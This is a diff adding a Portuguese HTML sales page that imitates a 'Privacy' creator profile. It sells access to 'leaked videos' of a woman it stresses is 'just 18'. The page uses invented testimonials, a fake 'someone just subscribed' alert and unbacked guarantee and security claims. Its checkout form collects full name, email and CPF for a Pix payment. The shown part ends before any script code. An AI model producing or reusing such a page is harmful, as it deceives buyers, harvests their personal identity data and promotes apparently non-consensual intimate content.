@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Privacy | Laurinha Oficial</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+body { font-family:'Inter',sans-serif; background:#f5f5f5; color:#1a1a1a; max-width:480px; margin:0 auto; min-height:100vh; }
+
+.top-bar {
+  background:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:12px 16px;
+  position:sticky;
+  top:0;
+  z-index:100;
+  border-bottom:1px solid #f0f0f0;
+}
+.logo-text { font-size:20px; font-weight:700; color:#1a1a1a; letter-spacing:-0.5px; display:flex; align-items:center; gap:6px; }
+.logo-dot { color:#f97316; font-size:24px; }
+
+.banner-wrap {
+  width:100%; height:160px;
+  background:linear-gradient(135deg,#2c1810 0%,#5a2a1a 50%,#1a0f0a 100%);
+  position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center;
+}
+.banner-stats {
+  position:absolute; top:12px; left:12px;
+  display:flex; gap:12px;
+}
+.banner-stat {
+  display:flex; align-items:center; gap:4px;
+  font-size:12px; color:rgba(255,255,255,0.9); font-weight:500;
+}
+.banner-stat svg { width:14px; height:14px; }
+.banner-overlay { position:absolute; inset:0; background:linear-gradient(to bottom,transparent 40%,rgba(0,0,0,0.35) 100%); }
+
+.profile-section { background:#fff; padding-bottom:16px; }
+.avatar-row {
+  display:flex; align-items:flex-end; justify-content:space-between;
+  padding:0 16px; margin-top:-40px;
+}
+.avatar-wrap { position:relative; display:inline-block; }
+.avatar {
+  width:80px; height:80px; border-radius:50%;
+  border:3px solid #fff; overflow:hidden;
+  background:linear-gradient(135deg,#3d1f28,#2a1015);
+  display:flex; align-items:center; justify-content:center;
+  font-size:28px; color:#fff;
+  box-shadow:0 2px 8px rgba(0,0,0,0.15);
+}
+.avatar img { width:100%; height:100%; object-fit:cover; }
+.live-badge {
+  position:absolute; bottom:-2px; left:50%; transform:translateX(-50%);
+  background:#f97316; color:#fff; font-size:9px; font-weight:700;
+  padding:2px 8px; border-radius:20px; white-space:nowrap;
+  letter-spacing:0.5px; border:2px solid #fff;
+}
+.profile-actions { display:flex; gap:16px; padding-bottom:8px; }
+.icon-btn { background:none; border:none; cursor:pointer; color:#666; padding:4px; }
+.icon-btn svg { width:22px; height:22px; }
+
+.profile-info { padding:10px 16px 0; }
+.profile-name-row { display:flex; align-items:center; gap:6px; margin-bottom:2px; }
+.profile-name { font-size:17px; font-weight:700; }
+.verified-icon svg { width:16px; height:16px; fill:#f97316; }
+.profile-handle { font-size:13px; color:#888; margin-bottom:10px; }
+.profile-bio { font-size:13px; color:#333; line-height:1.65; }
+
+.subscribe-section { background:#fff; margin-top:8px; padding:16px; }
+.subscribe-title { font-size:15px; font-weight:700; margin-bottom:12px; }
+
+.main-plan-btn {
+  width:100%; background:#f97316; color:#fff;
+  border:none; border-radius:10px; padding:14px 16px;
+  display:flex; align-items:center; justify-content:space-between;
+  cursor:pointer; margin-bottom:4px; position:relative; overflow:hidden;
+  transition:background 0.2s;
+}
+.main-plan-btn:hover { background:#ea6c0a; }
+.popular-badge {
+  position:absolute; top:0; left:50%; transform:translateX(-50%);
+  background:#c2410c; color:#fff; font-size:9px; font-weight:700;
+  padding:3px 14px; border-radius:0 0 8px 8px; letter-spacing:0.5px; white-space:nowrap;
+}
+.main-plan-left { text-align:left; margin-top:8px; }
+.main-plan-name { font-size:15px; font-weight:800; letter-spacing:0.5px; }
+.main-plan-extra { font-size:11px; opacity:0.85; margin-top:2px; }
+.main-plan-price { font-size:17px; font-weight:800; flex-shrink:0; }
+
+.promo-toggle {
+  width:100%; background:none; border:none;
+  display:flex; align-items:center; justify-content:space-between;
+  padding:14px 0; cursor:pointer;
+  font-size:14px; font-weight:600; color:#1a1a1a;
+  border-bottom:1px solid #f0f0f0;
+}
+.promo-toggle svg { transition:transform 0.3s; color:#888; }
+.promo-toggle.open svg { transform:rotate(180deg); }
+
+.promo-list { display:none; flex-direction:column; gap:8px; padding-top:10px; }
+.promo-list.open { display:flex; }
+
+.promo-item {
+  width:100%; background:#fff; border:1.5px solid #e5e5e5;
+  border-radius:10px; padding:14px 16px;
+  display:flex; align-items:center; justify-content:space-between;
+  cursor:pointer; transition:border-color 0.2s;
+}
+.promo-item:hover { border-color:#f97316; }
+.promo-item-left { display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
+.promo-item-name { font-size:13px; font-weight:700; letter-spacing:0.3px; }
+.badge { font-size:10px; font-weight:600; padding:2px 8px; border-radius:20px; background:#fff3e0; color:#f97316; white-space:nowrap; }
+.promo-price { font-size:15px; font-weight:800; color:#f97316; flex-shrink:0; }
+
+.tabs-section { background:#fff; margin-top:8px; }
+.tabs { display:flex; border-bottom:1.5px solid #f0f0f0; }
+.tab {
+  flex:1; padding:13px; text-align:center;
+  font-size:13px; font-weight:600; color:#888;
+  cursor:pointer; border:none; border-bottom:2px solid transparent;
+  background:none; transition:all 0.2s;
+}
+.tab.active { color:#f97316; border-bottom-color:#f97316; }
+
+.feed { background:#fff; }
+.post-item { border-bottom:1px solid #f5f5f5; padding:12px 16px; }
+.post-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:10px; }
+.post-user { display:flex; align-items:center; gap:10px; }
+.post-avatar {
+  width:38px; height:38px; border-radius:50%;
+  background:linear-gradient(135deg,#3d1f28,#2a1015);
+  display:flex; align-items:center; justify-content:center;
+  font-size:14px; color:#fff; overflow:hidden; flex-shrink:0;
+}
+.post-avatar img { width:100%; height:100%; object-fit:cover; }
+.post-username { font-size:13px; font-weight:600; }
+.post-handle { font-size:12px; color:#888; }
+.post-menu-btn { background:none; border:none; cursor:pointer; color:#888; padding:4px; }
+.post-menu-btn svg { width:16px; height:16px; }
+
+.post-body {
+  position:relative; border-radius:12px; overflow:hidden;
+  background:#e8e8e8; aspect-ratio:4/3;
+  display:flex; align-items:center; justify-content:center;
+  cursor:pointer;
+}
+.post-lock {
+  position:absolute; inset:0;
+  display:flex; flex-direction:column;
+  align-items:center; justify-content:center; gap:8px;
+}
+.lock-circle {
+  width:52px; height:52px; background:rgba(255,255,255,0.9);
+  border-radius:50%; display:flex; align-items:center; justify-content:center;
+  box-shadow:0 2px 8px rgba(0,0,0,0.1);
+}
+.lock-circle svg { width:24px; height:24px; color:#888; }
+
+.post-footer { display:flex; align-items:center; gap:16px; margin-top:10px; }
+.post-action {
+  display:flex; align-items:center; gap:5px;
+  font-size:13px; color:#555; background:none; border:none; cursor:pointer;
+}
+.post-action svg { width:18px; height:18px; }
+.post-bookmark { margin-left:auto; background:none; border:none; cursor:pointer; color:#555; }
+.post-bookmark svg { width:18px; height:18px; }
+
+.combos-section { background:#fff; margin-top:8px; padding:16px; }
+.combos-btn {
+  width:100%; background:#f97316; color:#fff;
+  border:none; border-radius:10px; padding:16px;
+  font-size:15px; font-weight:800; cursor:pointer;
+  display:flex; align-items:center; justify-content:space-between;
+  letter-spacing:0.5px; transition:background 0.2s; font-family:'Inter',sans-serif;
+}
+.combos-btn:hover { background:#ea6c0a; }
+.combos-btn svg { width:24px; height:24px; }
+
+.testi-section { background:#fff; margin-top:8px; padding:16px; }
+.section-title { font-size:17px; font-weight:700; margin-bottom:14px; text-align:center; }
+.testi-scroll { display:flex; gap:12px; overflow-x:auto; scrollbar-width:none; padding-bottom:4px; }
+.testi-scroll::-webkit-scrollbar { display:none; }
+.testi-card {
+  flex:0 0 200px; background:#fff; border:1px solid #f0f0f0;
+  border-radius:12px; padding:14px; box-shadow:0 2px 8px rgba(0,0,0,0.06); text-align:center;
+}
+.testi-avatar {
+  width:60px; height:60px; border-radius:50%; background:#f0f0f0;
+  margin:0 auto 8px; overflow:hidden;
+  display:flex; align-items:center; justify-content:center; font-size:24px;
+}
+.testi-name { font-size:13px; font-weight:700; margin-bottom:6px; }
+.testi-text { font-size:12px; color:#555; line-height:1.6; }
+
+.trust-section { background:#fff; margin-top:8px; padding:16px; }
+.trust-item {
+  display:flex; align-items:center; gap:10px; padding:10px 0;
+  font-size:13px; font-weight:500;
+  border-bottom:1px solid #f5f5f5; justify-content:center; text-align:center;
+}
+.trust-item:last-child { border-bottom:none; }
+.trust-emoji { font-size:18px; }
+
+.faq-section { background:#fff; margin-top:8px; padding:16px; }
+.faq-item { border:1px solid #f0f0f0; border-radius:10px; margin-bottom:10px; overflow:hidden; }
+.faq-q {
+  display:flex; align-items:center; justify-content:space-between;
+  padding:14px 16px; font-size:14px; font-weight:600;
+  cursor:pointer; background:#fff; border:none;
+  width:100%; text-align:left; gap:12px; font-family:'Inter',sans-serif;
+}
+.faq-q svg { flex-shrink:0; color:#888; transition:transform 0.3s; }
+.faq-item.open .faq-q svg { transform:rotate(45deg); color:#f97316; }
+.faq-a { max-height:0; overflow:hidden; transition:max-height 0.3s ease; font-size:13px; color:#555; line-height:1.7; }
+.faq-item.open .faq-a { max-height:200px; }
+.faq-a-inner { padding:0 16px 14px; }
+
+.toast {
+  position:fixed; bottom:24px; left:50%;
+  transform:translateX(-50%) translateY(80px);
+  background:#fff; color:#1a1a1a;
+  padding:12px 20px; border-radius:30px;
+  font-size:13px; font-weight:500; z-index:999;
+  transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  white-space:nowrap; box-shadow:0 4px 20px rgba(0,0,0,0.15);
+  border:1px solid #f0f0f0;
+}
+.toast.show { transform:translateX(-50%) translateY(0); }
+
+.modal-overlay {
+  position:fixed; inset:0; background:rgba(0,0,0,0.6);
+  display:none; justify-content:center; align-items:flex-end;
+  z-index:1000; backdrop-filter:blur(4px);
+}
+.modal-overlay.active { display:flex; }
+.modal {
+  background:#fff; border-radius:24px 24px 0 0;
+  padding:20px 20px 36px; width:100%; max-width:480px;
+  position:relative; animation:slide-up 0.35s cubic-bezier(0.34,1.2,0.64,1);
+}
+@keyframes slide-up { from{transform:translateY(100%)} to{transform:translateY(0)} }
+.modal-handle {
+  width:40px; height:4px; background:#e0e0e0;
+  border-radius:2px; margin:0 auto 20px;
+}
+.modal-close {
+  position:absolute; top:16px; right:16px;
+  width:30px; height:30px; background:#f5f5f5;
+  border:none; border-radius:50%; font-size:16px;
+  cursor:pointer; display:flex; align-items:center;
+  justify-content:center; color:#666;
+}
+.modal-title { font-size:18px; font-weight:700; margin-bottom:4px; }
+.modal-sub { font-size:13px; color:#888; margin-bottom:20px; }
+.modal-sub strong { color:#f97316; font-size:18px; font-weight:800; }
+
+.field { margin-bottom:14px; }
+.field label { display:block; font-size:12px; color:#888; font-weight:500; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.5px; }
+.field input {
+  width:100%; border:1.5px solid #e5e5e5; border-radius:10px;
+  padding:13px 14px; font-size:15px; color:#1a1a1a;
+  font-family:'Inter',sans-serif; outline:none;
+  transition:border-color 0.2s; background:#fafafa;
+}
+.field input:focus { border-color:#f97316; background:#fff; }
+.field input::placeholder { color:#bbb; }
+
+.error-box {
+  background:#fff0f0; border:1px solid #ffd0d0;
+  color:#cc0000; font-size:13px; padding:10px 14px;
+  border-radius:10px; margin-bottom:14px; display:none;
+}
+.submit-btn {
+  width:100%; padding:15px; background:#f97316; color:#fff;
+  border:none; border-radius:12px; font-size:16px; font-weight:800;
+  cursor:pointer; font-family:'Inter',sans-serif;
+  transition:background 0.2s, transform 0.1s; margin-top:4px;
+}
+.submit-btn:hover { background:#ea6c0a; }
+.submit-btn:active { transform:scale(0.98); }
+
+.loading-box { text-align:center; padding:40px 0; display:none; }
+.spinner {
+  width:44px; height:44px; border:3px solid #f0f0f0;
+  border-top-color:#f97316; border-radius:50%;
+  animation:spin 0.8s linear infinite; margin:0 auto 16px;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+.loading-box p { font-size:14px; color:#888; }
+
+.pix-box { display:none; text-align:center; }
+.qr-wrap { background:#fff; border:2px solid #f0f0f0; border-radius:16px; padding:16px; display:inline-block; margin:12px 0; }
+.qr-wrap img { width:180px; height:180px; display:block; }
+.pix-label { font-size:12px; color:#888; margin-bottom:8px; text-align:left; font-weight:500; text-transform:uppercase; letter-spacing:0.5px; }
+.pix-code-box {
+  background:#f8f8f8; border:1.5px dashed #ddd; border-radius:10px;
+  padding:12px; font-size:11px; font-family:monospace;
+  word-break:break-all; color:#555; text-align:left;
+  max-height:70px; overflow-y:auto; margin-bottom:14px;
+}
+.copy-btn {
+  width:100%; padding:14px; background:#1a1a1a; color:#fff;
+  border:none; border-radius:12px; font-size:14px; font-weight:700;
+  cursor:pointer; font-family:'Inter',sans-serif; transition:background 0.2s;
+}
+.copy-btn:hover { background:#333; }
+.await-text { font-size:12px; color:#aaa; margin-top:12px; }
+
+.like-btn.liked { color:#e11d48 !important; }
+.like-btn.liked svg { fill:#e11d48; stroke:#e11d48; transform:scale(1.2); }
+.like-btn svg { transition:fill 0.2s, stroke 0.2s, transform 0.15s; }
+
+footer { text-align:center; padding:20px; font-size:12px; color:#aaa; background:#fff; margin-top:8px; border-top:1px solid #f0f0f0; }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="top-bar">
+  <div class="logo-text">
+    <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
+      <circle cx="16" cy="16" r="16" fill="#f97316"/>
+      <path d="M10 8h5c3.5 0 6 2 6 5s-2.5 5-6 5h-2v5h-3V8z" fill="white"/>
+      <circle cx="16" cy="13" r="2" fill="#f97316" opacity="0.4"/>
+    </svg>
+    privacy<span class="logo-dot">.</span>
+  </div>
+</div>
+
+<!-- BANNER -->
+<div class="banner-wrap">
+  <svg width="80" height="80" viewBox="0 0 80 80" opacity="0.08"><text y="60" font-size="70">🔥</text></svg>
+  <div class="banner-overlay"></div>
+  <div class="banner-stats">
+    <div class="banner-stat">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
+      102
+    </div>
+    <div class="banner-stat">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M15 10l4.553-2.277A1 1 0 0121 8.682v6.636a1 1 0 01-1.447.894L15 14M3 8a2 2 0 00-2 2v4a2 2 0 002 2h8a2 2 0 002-2v-4a2 2 0 00-2-2H3z"/></svg>
+      64
+    </div>
+    <div class="banner-stat">
+      <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z"/></svg>
+      5K
+    </div>
+  </div>
+</div>
+
+<!-- PROFILE -->
+<div class="profile-section">
+  <div class="avatar-row">
+    <div class="avatar-wrap">
+      <div class="avatar">L</div>
+      <div class="live-badge">AO VIVO AGORA</div>
+    </div>
+    <div class="profile-actions">
+      <button class="icon-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg></button>
+      <button class="icon-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg></button>
+      <button class="icon-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z"/></svg></button>
+    </div>
+  </div>
+  <div class="profile-info">
+    <div class="profile-name-row">
+      <span class="profile-name">Laurinha Oficial</span>
+      <span class="verified-icon"><svg viewBox="0 0 24 24"><path d="M9 12l2 2 4-4M7.835 4.697a3.42 3.42 0 001.946-.806 3.42 3.42 0 014.438 0 3.42 3.42 0 001.946.806 3.42 3.42 0 013.138 3.138 3.42 3.42 0 00.806 1.946 3.42 3.42 0 010 4.438 3.42 3.42 0 00-.806 1.946 3.42 3.42 0 01-3.138 3.138 3.42 3.42 0 00-1.946.806 3.42 3.42 0 01-4.438 0 3.42 3.42 0 00-1.946-.806 3.42 3.42 0 01-3.138-3.138 3.42 3.42 0 00-.806-1.946 3.42 3.42 0 010-4.438 3.42 3.42 0 00.806-1.946 3.42 3.42 0 013.138-3.138z"/></svg></span>
+    </div>
+    <div class="profile-handle">@Laurinha_vip1</div>
+    <div class="profile-bio">
+      🔥 Laurinha VIP 🔥<br>
+      Apenas 18 aninhos, Laurinha é a mistura perfeita de beleza natural com aquele olhar provocante que prende atenção desde o primeiro segundo.<br>
+      Vídeos Vazados da Laurinha 👁️<br>
+      Faça sua assinatura agora e garanta acesso imediato aos meus melhores vídeos do Privacy 🔥
+    </div>
+  </div>
+</div>
+
+<!-- SUBSCRIBE -->
+<div class="subscribe-section">
+  <div class="subscribe-title">Assine agora:</div>
+  <button class="main-plan-btn" onclick="openCheckout(999,'Acesso por 1 Mês')">
+    <div class="popular-badge">MAIS POPULAR 🔥🔥</div>
+    <div class="main-plan-left">
+      <div class="main-plan-name">ACESSO POR 1 MÊS</div>
+      <div class="main-plan-extra">+ ACESSO AS LIVES DIÁRIAS!</div>
+    </div>
+    <div class="main-plan-price">R$ 9,99</div>
+  </button>
+
+  <div class="promo-item" onclick="openCheckout(2990,'Acesso por 3 Meses')" style="margin-top:8px;">
+    <div class="promo-item-left">
+      <span class="promo-item-name">ACESSO POR 3 MESES</span>
+      <span class="badge">Economia</span>
+      <span class="badge" style="background:#fde8f0;color:#e91e8c;">+ Nº pessoal de brinde</span>
+    </div>
+    <span class="promo-price">R$ 29,90</span>
+  </div>
+  <div class="promo-item" onclick="openCheckout(3990,'Acesso Vitalício + Vídeo Chamada por 1 Mês')" style="margin-top:8px;">
+    <div class="promo-item-left">
+      <span class="promo-item-name">ACESSO VITALÍCIO + VÍDEO CHAMADA POR 1 MÊS</span>
+      <span class="badge">Melhor oferta</span>
+      <span class="badge" style="background:#fde8f0;color:#e91e8c;">+ Nº pessoal de brinde</span>
+    </div>
+    <span class="promo-price">R$ 39,90</span>
+  </div>
+</div>
+
+<!-- TABS + FEED -->
+<div class="tabs-section">
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab(this)">93 postagens</button>
+    <button class="tab" onclick="switchTab(this)">166 mídias</button>
+  </div>
+  <div class="feed">
+    <div class="post-item">
+      <div class="post-header">
+        <div class="post-user">
+          <div class="post-avatar">L</div>
+          <div><div class="post-username">Laurinha santos</div><div class="post-handle">@Laurinha_vip1</div></div>
+        </div>
+        <button class="post-menu-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg></button>
+      </div>
+      <div class="post-body" onclick="openCheckout(999,'Acesso por 1 Mês')">
+        <div class="post-lock">
+          <div class="lock-circle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+          </div>
+        </div>
+      </div>
+      <div class="post-footer">
+        <button class="post-action like-btn" onclick="toggleLike(this)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg> <span>574</span></button>
+        <button class="post-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> 78</button>
+        <button class="post-bookmark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z"/></svg></button>
+      </div>
+    </div>
+
+    <!-- POST TELEGRAM GRÁTIS -->
+    <div class="post-item">
+      <div class="post-header">
+        <div class="post-user">
+          <div class="post-avatar">L</div>
+          <div><div class="post-username">Laurinha santos</div><div class="post-handle">@Laurinha_vip1</div></div>
+        </div>
+        <button class="post-menu-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg></button>
+      </div>
+      <a href="https://t.me/+XLFcd_iSjwhmMWZh" target="_blank" style="display:block;text-decoration:none;">
+        <div style="background:linear-gradient(135deg,#fdf2f8,#fce7f3);border-radius:14px;padding:22px 18px;border:1.5px solid #f9a8d4;text-align:center;cursor:pointer;">
+          <div style="font-size:34px;margin-bottom:10px;">😈</div>
+          <div style="font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:12px;">Meu grupo de amostras grátis bb 👇😈</div>
+          <div style="display:inline-flex;align-items:center;gap:8px;background:#2AABEE;color:#fff;padding:11px 24px;border-radius:30px;font-size:13px;font-weight:700;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 13.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/></svg>
+            Entrar no grupo grátis
+          </div>
+        </div>
+      </a>
+      <div class="post-footer" style="margin-top:10px;">
+        <button class="post-action like-btn" onclick="toggleLike(this)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg> <span>1.2k</span></button>
+        <button class="post-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> 234</button>
+        <button class="post-bookmark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z"/></svg></button>
+      </div>
+    </div>
+
+    <div class="post-item">
+      <div class="post-header">
+        <div class="post-user">
+          <div class="post-avatar">L</div>
+          <div><div class="post-username">Laurinha santos</div><div class="post-handle">@Laurinha_vip1</div></div>
+        </div>
+        <button class="post-menu-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg></button>
+      </div>
+      <div class="post-body" style="background:#2a1810;" onclick="openCheckout(2990,'Acesso por 12 Meses')">
+        <div class="post-lock">
+          <div class="lock-circle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+          </div>
+        </div>
+      </div>
+      <div class="post-footer">
+        <button class="post-action like-btn" onclick="toggleLike(this)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg> <span>312</span></button>
+        <button class="post-action"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg> 45</button>
+        <button class="post-bookmark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 012-2h10a2 2 0 012 2z"/></svg></button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TODOS OS COMBOS -->
+<div class="combos-section">
+  <button class="combos-btn" onclick="openCheckout(4990,'Todos os Combos - Privacy')">
+    QUERO TODOS OS COMBOS — R$ 49,90
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
+  </button>
+</div>
+
+<!-- TESTIMONIALS -->
+<div class="testi-section">
+  <div class="section-title">📢 O que estão dizendo...</div>
+  <div class="testi-scroll">
+    <div class="testi-card"><div class="testi-avatar">👨</div><div class="testi-name">João Henrique, 32 anos</div><div class="testi-text">"Não acreditava que seria tão bom por esse preço, achei q era golpe mas o acesso foi instantâneo. Recomendo!"</div></div>
+    <div class="testi-card"><div class="testi-avatar">👨</div><div class="testi-name">Carlos Silva, 45 anos</div><div class="testi-text">"Conteúdo sem censura, bem melhor que esses sites por aí. E ainda recebo no zap? Tô dentro"</div></div>
+    <div class="testi-card"><div class="testi-avatar">👨</div><div class="testi-name">Marcelo Tavares, 31 anos</div><div class="testi-text">"Tô no grupo VIP, recebo vídeo todo dia de manhã... é tipo meu bom dia personalizado"</div></div>
+    <div class="testi-card"><div class="testi-avatar">👨</div><div class="testi-name">Fernando, 52 anos</div><div class="testi-text">"Acesso imediato, tudo liberado e ainda ganhei pack de boas-vindas. Que isso."</div></div>
+  </div>
+</div>
+
+<!-- TRUST -->
+<div class="trust-section">
+  <div class="trust-item"><span class="trust-emoji">🔒</span><strong>Seu acesso é 100% seguro com criptografia SSL</strong></div>
+  <div class="trust-item"><span class="trust-emoji">✅</span><strong>Garantia total: seu dinheiro de volta se não ficar satisfeito</strong></div>
+  <div class="trust-item"><span class="trust-emoji">🛑</span><strong>Cancele quando quiser, sem burocracia</strong></div>
+  <div class="trust-item"><span class="trust-emoji">💬</span><strong>Alguma dúvida? Fale conosco</strong></div>
+</div>
+
+<!-- FAQ -->
+<div class="faq-section">
+  <div class="section-title" style="text-align:left;">Perguntas Frequentes</div>
+  <div class="faq-item">
+    <button class="faq-q" onclick="toggleFaq(this)">O conteúdo é realmente explícito?<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+    <div class="faq-a"><div class="faq-a-inner">Sim! Todo o conteúdo é 100% explícito e sem censura. Você terá acesso ao que mais deseja ver.</div></div>
+  </div>
+  <div class="faq-item">
+    <button class="faq-q" onclick="toggleFaq(this)">O pagamento é seguro e discreto?<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+    <div class="faq-a"><div class="faq-a-inner">Totalmente! Seu pagamento é discreto e ninguém saberá do que se trata.</div></div>
+  </div>
+  <div class="faq-item">
+    <button class="faq-q" onclick="toggleFaq(this)">Como vou receber o conteúdo?<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+    <div class="faq-a"><div class="faq-a-inner">Após o pagamento via Pix, você receberá o acesso direto no seu E-mail em até 2 minutos.</div></div>
+  </div>
+  <div class="faq-item">
+    <button class="faq-q" onclick="toggleFaq(this)">E se eu tiver problemas com o acesso?<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+    <div class="faq-a"><div class="faq-a-inner">Você poderá entrar em contato direto com o suporte no WhatsApp que será enviado junto ao conteúdo.</div></div>
+  </div>
+</div>
+
+<footer>© 2025 Privacy · Laurinha Oficial · Todos os direitos reservados</footer>
+
+<!-- TOAST -->
+<div class="toast" id="toast">⚡ Alguém acabou de <strong>&nbsp;Assinar um Plano!</strong></div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal">
+    <div class="modal-handle"></div>
+    <button class="modal-close" id="modalClose">×</button>
+
+    <div id="formStep">
+      <div class="modal-title">Finalizar Assinatura</div>
+      <div class="modal-sub" id="modalSub">Plano: <strong id="modalTitle">—</strong><br>Valor: <strong id="modalPrice" style="color:#f97316;font-size:18px;font-weight:800;">—</strong></div>
+      <div class="error-box" id="errorBox"></div>
+      <div class="field"><label>Nome Completo</label><input type="text" id="custName" placeholder="Seu nome completo"></div>
+      <div class="field"><label>E-mail</label>
+        <input type="email" id="custEmail" placeholder="seu@email.com" list="emailSuggestions" autocomplete="off">
+        <datalist id="emailSuggestions"></datalist>
+      </div>
+      <div class="field"><label>CPF</label><input type="text" id="custDoc" placeholder="000.000.000-00" maxlength="14" inputmode="numeric"></div>
+      <button class="submit-btn" id="generateBtn">⚡ GERAR PIX AGORA</button>
+    </div>
+
+    <div class="loading-box" id="loadingStep">
+      <div class="spinner"></div>
+      <p>Gerando seu QR Code PIX…</p>
+    </div>
+
